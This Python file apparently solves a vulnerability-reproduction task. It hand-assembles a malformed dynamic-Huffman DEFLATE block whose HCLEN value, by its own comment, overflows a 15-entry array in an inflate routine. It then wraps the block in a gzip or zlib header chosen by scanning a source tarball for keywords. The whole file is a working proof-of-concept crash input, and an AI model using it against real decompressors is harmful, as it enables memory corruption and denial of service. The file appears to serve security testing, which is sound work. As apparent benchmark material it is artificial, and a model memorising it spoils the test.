import io
import os
import re
import tarfile
from typing import Optional


class Solution:
    def _make_deflate_trigger(self) -> bytes:
        class _BW:
            __slots__ = ("buf", "nbits", "out")

            def __init__(self):
                self.buf = 0
                self.nbits = 0
                self.out = bytearray()

            def put(self, val: int, bits: int) -> None:
                if bits <= 0:
                    return
                mask = (1 << bits) - 1
                self.buf |= (val & mask) << self.nbits
                self.nbits += bits
                while self.nbits >= 8:
                    self.out.append(self.buf & 0xFF)
                    self.buf >>= 8
                    self.nbits -= 8

            def finish(self) -> bytes:
                if self.nbits:
                    self.out.append(self.buf & 0xFF)
                    self.buf = 0
                    self.nbits = 0
                return bytes(self.out)

        bw = _BW()
        bw.put(1, 1)        # BFINAL=1
        bw.put(2, 2)        # BTYPE=10 (dynamic)
        bw.put(0, 5)        # HLIT=0 (257)
        bw.put(0, 5)        # HDIST=0 (1)
        bw.put(12, 4)       # HCLEN=12 -> (12+4)=16 code length codes (overflows 15-sized array)
        for _ in range(16):
            bw.put(0, 3)    # all code length code lengths = 0 (invalid, should error cleanly in fixed)
        data = bw.finish()
        if len(data) != 9:
            if len(data) < 9:
                data += b"\x00" * (9 - len(data))
            else:
                data = data[:9]
        return data

    def _detect_wrapper(self, src_path: str) -> str:
        if not src_path or not os.path.exists(src_path):
            return "gzip"

        score_gzip = 0
        score_zlib = 0
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    name = (m.name or "").lower()
                    if any(k in name for k in ("gzip", "gunzip", "gz", "inflate")):
                        score_gzip += 2
                    if any(k in name for k in ("zlib", "adler", "deflate")):
                        score_zlib += 1

                    if not m.isfile() or m.size <= 0:
                        continue
                    if m.size > 256 * 1024:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    raw = f.read(256 * 1024)
                    if not raw:
                        continue

                    low = raw.lower()
                    if b"gzip" in low or b"gunzip" in low:
                        score_gzip += 3
                    if (b"0x1f" in low and b"0x8b" in low) or b"\x1f\x8b" in raw:
                        score_gzip += 3

                    if b"zlib" in low or b"adler" in low:
                        score_zlib += 3
                    if (b"cmf" in low and b"flg" in low) or (b"0x78" in low and (b"0x9c" in low or b"0xda" in low)):
                        score_zlib += 2

                    if score_gzip >= 6 and score_gzip >= score_zlib + 2:
                        return "gzip"
                    if score_zlib >= 6 and score_zlib >= score_gzip + 2:
                        return "zlib"
        except Exception:
            return "gzip"

        if score_gzip >= score_zlib:
            return "gzip"
        return "zlib"

    def solve(self, src_path: str) -> bytes:
        deflate = self._make_deflate_trigger()
        wrapper = self._detect_wrapper(src_path)

        if wrapper == "zlib":
            # zlib header: 0x78 0x9c; adler32 for empty output: 0x00000001 (big-endian)
            return b"\x78\x9c" + deflate + b"\x00\x00\x00\x01"

        # gzip wrapper
        hdr = bytes([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03])
        ftr = b"\x00" * 8
        return hdr + deflate + ftr